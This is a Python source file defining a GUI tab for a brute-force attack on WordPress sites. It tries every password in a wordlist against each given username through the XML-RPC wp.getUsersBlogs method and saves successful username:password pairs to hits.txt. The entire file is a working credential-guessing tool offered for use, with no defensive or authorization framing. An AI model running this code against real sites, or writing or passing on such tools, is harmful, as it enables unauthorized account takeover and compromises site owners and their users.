import customtkinter as ctk
from tkinter import messagebox
import xmlrpc.client

def brute_force_action(target_entry, usernames_box, wordlist_entry, log_box):
    target = target_entry.get().strip()
    usernames = [u.strip() for u in usernames_box.get("1.0", "end").strip().splitlines()]
    wordlist_path = wordlist_entry.get().strip()

    if not target or not usernames or not wordlist_path:
        messagebox.showerror("Error", "Please fill all fields.")
        return

    try:
        with open(wordlist_path, 'r') as f:
            passwords = [line.strip() for line in f if line.strip()]
    except Exception as e:
        messagebox.showerror("File Error", f"Cannot read password list:\n{e}")
        return

    log_box.insert("end", "[*] Starting brute force...\n")
    server = xmlrpc.client.ServerProxy(target)

    for user in usernames:
        log_box.insert("end", f"\n[*] Trying user: {user}\n")
        for password in passwords:
            try:
                resp = server.wp.getUsersBlogs(user, password)
                if resp:
                    hit = f"[+] HIT: {user}:{password}\n"
                    log_box.insert("end", hit)
                    with open("hits.txt", "a") as hit_file:
                        hit_file.write(f"{user}:{password}\n")
                    break
            except xmlrpc.client.Fault:
                pass
            except Exception as e:
                log_box.insert("end", f"[-] Error with {user}: {e}\n")
                break
    log_box.insert("end", "[*] Brute force finished.\n")

def brute_tab_widgets(tab):
    target_entry = ctk.CTkEntry(tab, placeholder_text="Target URL")
    target_entry.pack(pady=10, padx=10)

    usernames_box = ctk.CTkTextbox(tab, height=10, width=40)
    usernames_box.pack(pady=10, padx=10)

    wordlist_entry = ctk.CTkEntry(tab, placeholder_text="Path to wordlist")
    wordlist_entry.pack(pady=10, padx=10)

    log_box = ctk.CTkTextbox(tab, height=15, width=80)
    log_box.pack(pady=10, padx=10)

    brute_button = ctk.CTkButton(tab, text="Start Brute Force", command=lambda: brute_force_action(target_entry, usernames_box, wordlist_entry, log_box))
    brute_button.pack(pady=10, padx=10)
